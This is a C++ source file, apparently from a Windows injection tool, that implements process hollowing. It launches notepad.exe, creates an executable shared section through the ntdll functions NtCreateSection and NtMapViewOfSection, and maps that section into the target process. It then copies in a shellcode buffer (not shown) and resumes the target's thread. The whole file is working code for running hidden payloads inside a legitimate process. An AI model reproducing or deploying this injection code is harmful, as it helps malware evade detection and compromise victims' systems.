#include "pch.h"
#include "define.h"
#include "datastruct.h"
#include "hkutil.h"
#include "hktarget.h"
#include "hklocal.h"

bool hk_local::hollowTarget(DWORD PID) noexcept {
  if (!PID) {
    LOG("ERROR: Invalid process ID. Either the process is not running or "
        "couldn't be detected.");
    return false;
  }

  // initialization
  HANDLE hRThread = NULL;
  DWORD idRThread = 0;
  LPCSTR processPath = "C:\\Windows\\System32\\notepad.exe";
  LPVOID tgtSectionView = nullptr;
  ULONG retLength = 0;
  LUID privID{};

  // create function objects
  TUnmapViewOfSection hkUnmapViewOfSection =
      (TUnmapViewOfSection)hk_util::procAddr("ntdll", "ZwUnmapViewOfSection");

  // UNUSED
  TCreateUserThread hkCreateUserThread =
      (TCreateUserThread)hk_util::procAddr("ntdll", "RtlCreateUserThread");
  TResumeProcess hkResumeProcess =
      (TResumeProcess)hk_util::procAddr("ntdll", "NtResumeProcess");
  //
  /*
  //LOGn("Setting debug privilege...\t\t");
  if (hk_util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
    //LOG("Failure.");
    //ERRCHK;
  };

  LOG("Creating target process data structure.");*/

  hkTarget targetProc(processPath);
  hkShellCode shellCode(hk_util::shellCode, hk_util::shellCodeSize);

  if (!(tgtSectionView = injectCode(&targetProc, &shellCode))) {
    LOG("ERROR: Shell code injection failed. Error code:" << GetLastError());
        return false;
  }

  if(targetProc.resetContext()) {
    LOG("WARNING: Failed to properly restore context for the target process "
        "thread. Error Code: "
        << GetLastError());
  };
  ResumeThread(targetProc.hThread());

  // cleanup
  _getch();
  CloseHandle(hRThread);
  TerminateProcess(targetProc.hProcess(), 0);

  return true;
}

void* hk_local::injectCode(hkTarget* pTarget, hkShellCode* pCode) noexcept {
  
  HANDLE hSection = NULL;
  LARGE_INTEGER sectionSize{};
  LPVOID lpSectionLocal = nullptr, lpSectionTarget = nullptr;
  sectionSize.QuadPart = pCode->size;

  TCreateSection hkCreateSection =
      (TCreateSection)hk_util::procAddr("ntdll", "NtCreateSection");
  TMapViewOfSection hkMapViewOfSection =
      (TMapViewOfSection)hk_util::procAddr("ntdll", "NtMapViewOfSection");

  LOG("Creating section at 0x" << std::hex << hkCreateSection << ", size "
                               << std::dec << sectionSize.QuadPart);
  hkCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
                  PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

  LOG("Mapping local section view...");
  hkMapViewOfSection(hSection, GetCurrentProcess(), &lpSectionLocal, NULL, NULL,
                     NULL, &pCode->size, 2, NULL, PAGE_READWRITE);
  LOG("Mapped local section view at 0x" << std::hex << lpSectionLocal);

  LOG("Mapping target section view for PID " << pTarget->dwProcessId()
                                             << "...");
  if (hkMapViewOfSection(hSection, pTarget->hProcess(), &lpSectionTarget,
                         NULL, NULL, NULL, &pCode->size, 2, NULL,
                         PAGE_EXECUTE_READ) != 0) {
    LOG("ERROR: failed to map target section view. Error code: "
        << GetLastError());
    return nullptr;
  };

  LOG("Mapped target section view at 0x" << std::hex << lpSectionTarget);

  LOGn("Copying shellcode to the new section...\t\t");

  memcpy(lpSectionLocal, pCode->pData, pCode->size);

  LOG("SUCCESS.\n");

  CloseHandle(hSection);

  return lpSectionTarget;
}
